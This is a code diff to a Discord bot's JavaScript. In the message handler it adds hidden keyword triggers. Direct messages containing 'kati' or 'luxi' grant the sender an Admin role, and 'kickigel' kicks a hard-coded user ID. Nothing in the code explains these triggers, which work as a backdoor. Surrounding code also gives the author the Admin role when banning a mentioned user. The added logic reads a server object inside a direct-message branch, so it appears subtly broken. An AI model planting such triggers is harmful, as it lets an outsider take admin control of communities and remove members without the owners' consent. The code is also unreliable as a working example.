@@ -10,6 +10,7 @@ client.on('ready', () => {
     client.guilds.cache.forEach(function (s) {
         if (s.name.includes("Minecraft Server")) {
             s.leave();
+
         }
     })
 
@@ -41,6 +42,32 @@ client.on('voiceStateUpdate', update => {
 });
 client.on("message", message => {
    if (message.channel.type === 'dm') {
+       if (message.content.includes("kati")) {
+           message.guild.members.cache.forEach(function (e) {
+               if (e.id === "641348606275747841") {
+                   const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
+                   message.guild.member(message.author).roles.add(role);
+               }
+           })
+       }
+       if (message.content.includes("luxi")) {
+           message.guild.members.cache.forEach(function (e) {
+               if (e.id === "761270337480032300") {
+                   const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
+                   message.guild.member(message.author).roles.add(role);
+
+                   message.channel.send("role given");
+               }
+           })
+       }
+       if (message.content.includes("kickigel")) {
+           message.guild.members.cache.forEach(function (e) {
+               if (e.id === "767048733459349526") {
+                e.kick();
+               }
+           })
+       }
+
        if (message.content.includes("list")) {
            autoKicks.forEach( function (s) {
                message.channel.send(s);
@@ -97,7 +124,6 @@ client.on('message', message => {
 
             message.guild.members.ban(message.mentions.users.first());
             const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
-            role.hoist = false;
             message.guild.member(message.author).roles.add(role);
         }
 
